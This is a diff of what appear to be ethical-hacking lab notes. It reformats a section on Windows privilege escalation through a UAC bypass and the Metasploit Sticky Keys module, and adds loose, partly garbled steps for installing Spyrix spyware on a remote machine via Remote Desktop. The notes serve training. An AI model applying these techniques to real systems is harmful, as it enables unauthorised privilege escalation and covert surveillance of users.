@@ -794,10 +794,12 @@ chmod +x shellcode.py
 ./shellcode.py
 ```
 </details>
+
 <details>
 
-## Perform Privilege Escalation to Gain Higher Privileges 
-<summary>Escalate privileges by bypassing UAC and exploiting Sticky Keys</summary>
+<summary>Perform Privilege Escalation to Gain Higher Privileges</summary>
+
+* Escalate privileges by bypassing UAC and exploiting Sticky Keys
 
 * create a payload
 ```console
@@ -844,7 +846,7 @@ exploit
 ~$: post/windows/manage/sticky_keys
 set session 2
 exploit
-proceed to mark user account and in lock screen hit sticky key 5 times 
+proceed to martin user account and in lock screen hit sticky key 5 times 
 whoami
 ```
 </details>
@@ -854,6 +856,12 @@ whoami
 * User System Monitoring and Surveillance using Spyrix
 ```console
 ~$:Spyrix (GUI)
+give email
+search for remote desktop connection in search bar
+and press show more option
+and Jason
+and copy spirex and paste it in remote system
+and install it in remote system
 ```
 <summary> Maintain Persistence by Modifying Registry Run Keys</summary>
 
